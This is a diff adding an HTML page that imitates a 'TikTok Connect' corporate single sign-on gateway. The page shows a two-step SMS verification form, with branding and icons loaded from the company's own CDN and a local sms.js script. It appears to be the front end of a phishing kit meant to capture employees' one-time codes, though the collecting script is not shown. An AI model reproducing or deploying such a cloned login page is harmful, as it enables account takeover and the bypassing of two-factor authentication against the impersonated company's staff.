@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>TikTok Connect</title>
+  <link rel="shortcut icon" href="https://lf3-cdn-tos.bytegoofy.com/obj/goofy/system/platform/sso_fe/favicon.ico">
+  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,viewport-fit=cover,user-scalable=no,shrink-to-fit=no" />
+  <link rel="stylesheet" href="sms.css">
+</head>
+
+<body>
+
+  <div class="left">
+    <img src="/IMAGES/tiktok-sso-logo.png" class="tiktok-sso-logo">
+
+    <div class="left-content">
+      <h1>TikTok Connect</h1>
+      <p>
+        Through this intranet gateway we will provide you with secure and reliable authentication and authorization related services
+      </p>
+    </div>
+  </div>
+
+  <div class="right">
+
+    <div class="top-bar">
+      Due to compliance requirements associated with this gateway, applications integrated into TikTok Connect require users to use accounts and passwords alongside a secure SMS verification code to login. For any login issue, please contact page oncall support.
+    </div>
+
+    <div class="language-container">
+  <div class="language">
+    <img src="https://lf16-oversea.goofy-cdn.com/obj/goofy-va//system/platform/ngid_fe/1.0.0.156/images/global.svg">
+    <a>English</a>
+    <img src="https://lf16-oversea.goofy-cdn.com/obj/goofy-va//system/platform/ngid_fe/1.0.0.156/images/down.svg" class="img2">
+  </div>
+    </div>
+
+    <div class="login-box">
+
+<div class="back-button" onclick="goBack()">
+  <img src="https://lf16-oversea.goofy-cdn.com/obj/goofy-va//system/platform/ngid_fe/1.0.0.156/images/back.svg">
+  Back
+</div>
+
+      <h2>Two-step verification</h2>
+
+      <div class="input-group">
+
+  <div class="input-wrapper">
+
+  <div class="input-wrapper">
+  <input id="maskedInput" type="text" value="SMS" disabled style="color: rgba(28, 31, 35, 0.35);  -webkit-font-smoothing: antialiased;
+  font-family: Inter, -apple-system, BlinkMacSystemFont, Segoe UI, PingFang SC, Hiragino Sans GB, Microsoft YaHei, Helvetica Neue, Helvetica, Arial, sans-serif; letter-spacing: 0.4px;" >
+
+  <div class="code-wrapper">
+    <input id="codeInput" type="text" placeholder="Please get verification code" maxlength="6" style="cursor: text; margin-top: 20px; color: rgb(28, 31, 35); font-weight: 500;">
+
+    <div id="rightElement" class="right-element">
+  <div class="spinner input-spinner"></div>
+</div>
+  </div>
+</div>
+
+
+
+  </div>
+
+</div>
+     <div class="error-text" id="errorText">
+    Please enter the Email prefix or Email address
+  </div>
+</div>
+
+      <div class="action-row">
+  <button class="btn">
+    <span class="spinner"></span>
+    <span class="btn-text">Connect</span>
+  </button>
+
+  <p id="errorText" style="display:none;">
+</p>
+</div>
+    </div>
+
+  </div>
+<div class="support-btn">
+  <img src="https://lf16-oversea.goofy-cdn.com/obj/goofy-va/system/platform/ngid_libs/images/branding/semi/CustomerSupport.svg" />
+</div>
+</body>
+<script src="sms.js"></script>
+</html>
